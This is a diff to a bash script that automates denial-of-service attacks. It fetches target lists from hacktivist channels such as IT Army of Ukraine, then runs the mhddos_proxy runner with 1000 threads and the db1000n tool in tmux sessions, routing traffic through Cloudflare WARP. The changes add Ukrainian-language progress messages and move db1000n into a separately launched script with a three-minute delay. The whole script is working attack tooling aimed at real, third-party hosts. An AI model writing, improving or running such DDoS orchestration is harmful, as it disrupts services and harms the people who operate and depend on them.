@@ -22,11 +22,14 @@ export db1000n="off";
 ##########################################
 
 function get_targets () {
+    printf "Завантаження цілей..."
     rm -rf ~/multidd/targets/*
     # 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
     curl -s -X GET "https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt" -o ~/multidd/targets/source0.txt
     # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
     curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" -o ~/multidd/targets/db1000n.json
+    printf "\t\t [OK]\n"
+    printf "Підготовка цілей..."
     local i=1
     for path in "${itarmy_paths[@]}"
     do
@@ -50,6 +53,7 @@ function get_targets () {
             echo "$line" >> ~/multidd/targets/all_targets.txt
         fi
     done
+    printf "\t\t [OK]\n"
     local total_targets
     total_targets=$(wc -l < ~/multidd/targets/all_targets.txt)
     echo -e "Всього цілей: $total_targets"
@@ -72,14 +76,16 @@ function launch () {
         fi
         tmux new-session -s multidd -d 'gotop -sc solarized'
         tmux split-window -h -p 66 'bash auto_bash.sh'
-    else
+    elif [[ $db1000n == "on" ]];
+        then
         tmux new-session -s multidd -d 'bash auto_bash.sh'
+        tmux split-window -h -p 66 'bash db1000n_launch.sh'
     fi
     tmux attach-session -t multidd
 }
 #########################################
 function cleanup() {
-    deactivate
+    deactivate > /dev/null 2>&1
     if [[ $shape == "on" ]]; then
         IFACE=$(ip -o -4 route show to default | awk '{print $5}')
         sudo "$WS" -c -a "$IFACE"
@@ -186,10 +192,6 @@ while true; do
     then
         warp-cli connect
     fi
-    if [[ $db1000n == "on" ]]
-    then
-        ~/multidd/db1000n &
-    fi
     if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         python3 "$runner" -c ~/multidd/targets/lite_targets.txt "$methods" -t 1000 $args_to_pass &
@@ -242,16 +244,20 @@ while true; do
     pkill -f start.py; pkill -f runner.py;
     get_targets
     rm -rf ~/multidd/mhddos_proxy/
-    if [[ $db1000n == "on" ]]
-    then
-        pkill -f db1000n
-    fi
     if [[ $cloudflare == "on" ]]
     then
         warp-cli disconnect
     fi
 done
 EOF
+cat > db1000n_launch.sh << 'EOF'
+    #!/bin/bash
+    echo -e "Затримка в 3 хвилини до старту db1000n"
+    sleep 180
+    ~/multidd/db1000n &
+
+EOF
+
 trap cleanup INT
 get_targets
 launch
